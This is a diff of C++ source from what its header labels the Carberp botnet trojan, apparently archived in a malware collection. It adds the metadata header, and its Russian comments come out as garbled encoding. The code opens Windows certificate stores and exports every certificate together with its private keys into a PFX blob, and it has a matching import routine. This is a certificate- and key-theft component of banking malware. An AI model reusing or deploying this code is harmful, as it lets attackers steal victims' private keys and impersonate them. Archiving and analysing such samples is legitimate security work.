@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 #include <shlwapi.h>
@@ -11,10 +22,10 @@ typedef void (WINAPI *type_GetSert)(const char*, const char*);
 typedef void (WINAPI *type_GetSertDefault)();
 
 struct DataSert {
-  CRYPT_DATA_BLOB pfxBlob; //сертификат
-  char* name; //имя хранилища
+  CRYPT_DATA_BLOB pfxBlob; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+  char* name; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   WCHAR password[128];
-  int count; //количество сертификатов в хранилище
+  int count; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
 bool GetSert( DataSert& );
@@ -56,7 +67,7 @@ int main()
  dataSert.pfxBlob.pbData = 0;
  dataSert.pfxBlob.cbData = 0;
  dataSert.name = nameStore;
- //преобразовываем пароль в WCHAR
+ //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ WCHAR
  memset( dataSert.password, sizeof(dataSert.password), 0 );
  MultiByteToWideChar( CP_ACP, 0, password, -1, dataSert.password, sizeof(dataSert.password) );
 
@@ -89,13 +100,13 @@ bool GetSert( DataSert& dataSert )
   bool ret = false;
   HANDLE hstore = CertOpenSystemStore( NULL, dataSert.name );
   if( hstore != NULL ) {
-    dataSert.count = 0; //количество сертефикатов
+    dataSert.count = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     PCCERT_CONTEXT certContext = 0;
     while( (certContext = CertEnumCertificatesInStore( hstore, certContext ) ) != NULL)
       dataSert.count++;
 
     if( dataSert.count > 0 ) {
-      //Получаем размер хранилища.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       dataSert.pfxBlob.pbData = NULL;
       dataSert.pfxBlob.cbData = 0;
       if( PFXExportCertStoreEx( hstore, &dataSert.pfxBlob, dataSert.password, 0, EXPORT_PRIVATE_KEYS) != FALSE ) {
@@ -130,7 +141,7 @@ bool PutSert( DataSert& dataSert )
  }
  return ret;
 }
-//оставил код для экспорта иммпорта сертификатов DER
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DER
 /*
  pctx = CertCreateCertificateContext( X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, dataSert.pfxBlob.pbData, dataSert.pfxBlob.cbData );
  HANDLE hstore = CertOpenStore( CERT_STORE_PROV_SYSTEM, 0, 0, 
